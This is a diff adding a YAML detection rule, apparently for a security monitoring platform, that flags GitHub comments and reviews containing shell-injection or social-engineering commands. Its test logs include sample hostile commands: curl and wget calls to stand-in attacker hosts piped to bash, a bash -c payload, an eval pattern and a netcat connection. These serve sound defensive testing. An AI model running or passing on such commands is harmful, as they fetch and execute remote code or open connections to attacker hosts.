@@ -1,0 +1,241 @@
+AnalysisType: rule
+Filename: github_malicious_comment_content.py
+RuleID: "GitHub.Webhook.MaliciousCommentContent"
+DisplayName: "GitHub Malicious Comment/Review Content"
+Enabled: true
+LogTypes:
+  - GitHub.Webhook
+Reports:
+  MITRE ATT&CK:
+    - TA0001:T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
+    - TA0042:T1566  # Initial Access: Phishing
+Tags:
+  - Code Injection
+  - Supply Chain
+  - Social Engineering
+Severity: Medium
+Description: >
+  Detects malicious patterns in GitHub comment and review content that could indicate bash
+  injection attempts or social engineering attacks. This includes comments on issues, pull
+  requests, and pull request reviews. While comments cannot directly execute code, they can
+  be used to trick developers into running malicious commands. This rule detects command
+  substitution patterns similar to those found in the Nx vulnerability (GHSA-cxm3-wv7p-598c).
+Runbook: |
+  1. Review the comment or review content for malicious patterns
+  2. Check the author's profile and activity history
+  3. Determine if this is a legitimate comment or a social engineering attempt
+  4. Delete the comment/review if it's malicious
+  5. Report the user if they appear to be intentionally posting malicious content
+  6. Review other comments from the same user in the repository
+  7. Consider blocking the user from the repository/organization
+  8. Check if any developers may have already executed the malicious commands
+Reference: https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c
+Tests:
+  - Name: Issue Comment with Command Substitution
+    ExpectedResult: true
+    Log:
+      {
+        "action": "created",
+        "comment": {
+          "id": 123456,
+          "body": "Try running this command: $(curl evil.com/payload.sh)",
+          "user": {
+            "login": "malicious-user",
+            "id": 12345,
+            "type": "User"
+          },
+          "html_url": "https://github.com/org/repo/issues/1#issuecomment-123456",
+          "created_at": "2024-01-15T10:30:00Z"
+        },
+        "issue": {
+          "number": 1,
+          "title": "Help needed"
+        },
+        "repository": {
+          "name": "repo",
+          "full_name": "org/repo"
+        },
+        "sender": {
+          "login": "malicious-user"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR Comment with Backtick Command
+    ExpectedResult: true
+    Log:
+      {
+        "action": "created",
+        "comment": {
+          "id": 789012,
+          "body": "Can you test with: `wget attacker.com/malware | bash`",
+          "user": {
+            "login": "attacker"
+          },
+          "html_url": "https://github.com/org/repo/pull/5#issuecomment-789012"
+        },
+        "pull_request": {
+          "number": 5,
+          "title": "New feature"
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: PR Review with Shell Command
+    ExpectedResult: true
+    Log:
+      {
+        "action": "submitted",
+        "review": {
+          "id": 345678,
+          "body": "Looks good! Run /bin/bash -c 'malicious payload' to test",
+          "state": "approved",
+          "user": {
+            "login": "fake-reviewer"
+          },
+          "html_url": "https://github.com/org/repo/pull/10#pullrequestreview-345678",
+          "submitted_at": "2024-01-15T11:00:00Z"
+        },
+        "pull_request": {
+          "number": 10,
+          "title": "Bug fix"
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Edited Comment with Eval Pattern
+    ExpectedResult: true
+    Log:
+      {
+        "action": "edited",
+        "comment": {
+          "id": 999888,
+          "body": "Updated: eval($malicious_var)",
+          "user": {
+            "login": "suspicious"
+          }
+        },
+        "issue": {
+          "number": 50
+        },
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Normal Comment
+    ExpectedResult: false
+    Log:
+      {
+        "action": "created",
+        "comment": {
+          "id": 111222,
+          "body": "Thanks for the contribution! This looks great.",
+          "user": {
+            "login": "legitimate-reviewer"
+          }
+        },
+        "pull_request": {
+          "number": 25
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Review with Code Snippet (Normal)
+    ExpectedResult: false
+    Log:
+      {
+        "action": "submitted",
+        "review": {
+          "id": 555666,
+          "body": "Please update the function to handle edge cases better",
+          "state": "changes_requested",
+          "user": {
+            "login": "senior-dev"
+          }
+        },
+        "pull_request": {
+          "number": 30
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Non-Comment Event
+    ExpectedResult: false
+    Log:
+      {
+        "action": "push",
+        "ref": "refs/heads/main",
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Comment with Netcat Exfiltration
+    ExpectedResult: true
+    Log:
+      {
+        "action": "created",
+        "comment": {
+          "id": 777888,
+          "body": "Debug with: nc 1.2.3.4 4444",
+          "user": {
+            "login": "attacker"
+          }
+        },
+        "issue": {
+          "number": 100
+        },
+        "repository": {
+          "full_name": "victim/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Comment with Benign Inline Code
+    ExpectedResult: false
+    Log:
+      {
+        "action": "created",
+        "comment": {
+          "id": 888999,
+          "body": "You can use `npm install` to install the dependencies",
+          "user": {
+            "login": "helpful-dev"
+          }
+        },
+        "issue": {
+          "number": 101
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Review with Benign Inline Code
+    ExpectedResult: false
+    Log:
+      {
+        "action": "submitted",
+        "review": {
+          "id": 999000,
+          "body": "Please run `make test` before submitting",
+          "state": "changes_requested",
+          "user": {
+            "login": "reviewer"
+          }
+        },
+        "pull_request": {
+          "number": 102
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
